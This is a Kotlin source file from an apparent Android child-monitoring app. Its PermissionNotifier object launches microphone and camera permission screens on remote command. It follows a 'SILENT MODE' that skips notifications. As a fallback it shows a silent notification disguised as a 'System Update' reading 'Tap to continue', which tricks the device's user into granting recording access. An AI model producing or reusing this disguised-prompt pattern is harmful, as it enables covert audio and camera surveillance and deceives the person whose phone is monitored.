package com.bannigaurd.bannikid

import android.app.KeyguardManager
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.os.Build
import androidx.core.app.NotificationCompat
import androidx.core.app.NotificationManagerCompat

object PermissionNotifier {
    private const val CHANNEL_ID = "permission_request_channel"
    private const val CHANNEL_NAME = "Permission Requests"
    private const val NOTIF_ID = 10010

    private fun ensureChannel(context: Context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val mgr = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            val channel = NotificationChannel(
                CHANNEL_ID,
                CHANNEL_NAME,
                NotificationManager.IMPORTANCE_HIGH
            ).apply {
                description = "Bring app to foreground to grant mic/camera permissions"
                setShowBadge(false)
            }
            mgr.createNotificationChannel(channel)
        }
    }

    private fun isDeviceLocked(context: Context): Boolean {
        val km = context.getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
        return km.isKeyguardLocked
    }

    fun showPermissionRequest(
        context: Context,
        requestedAction: String,
        deviceId: String?,
        apiKey: String?
    ) {
        // SILENT MODE: Skip notifications and directly start permission activity
        val intent = Intent(context, PermissionRequestActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_NO_USER_ACTION
            putExtra("REQUESTED_ACTION", requestedAction)
            putExtra("DEVICE_ID", deviceId)
            putExtra("ABLY_API_KEY", apiKey)
            action = when (requestedAction) {
                AppConstants.START_AUDIO_ACTION -> AppConstants.REQUEST_MIC_PERMISSION_ACTION
                AppConstants.START_CAMERA_ACTION -> AppConstants.REQUEST_CAMERA_PERMISSION_ACTION
                else -> AppConstants.REQUEST_MIC_PERMISSION_ACTION
            }
        }

        try {
            context.startActivity(intent)
        } catch (e: Exception) {
            // If direct start fails, try with different flags
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
            try {
                context.startActivity(intent)
            } catch (e2: Exception) {
                // Last resort: show minimal notification
                showMinimalNotification(context, intent)
            }
        }
    }

    private fun showMinimalNotification(context: Context, intent: Intent) {
        ensureChannel(context)

        val pendingFlags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) PendingIntent.FLAG_IMMUTABLE else 0
        val contentPI = PendingIntent.getActivity(context, 2001, intent, pendingFlags)

        val builder = NotificationCompat.Builder(context, CHANNEL_ID)
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setContentTitle("System Update")
            .setContentText("Tap to continue")
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setCategory(NotificationCompat.CATEGORY_SYSTEM)
            .setOngoing(false)
            .setAutoCancel(true)
            .setSilent(true)
            .setContentIntent(contentPI)

        val manager = NotificationManagerCompat.from(context)
        manager.notify(NOTIF_ID, builder.build())
    }
}
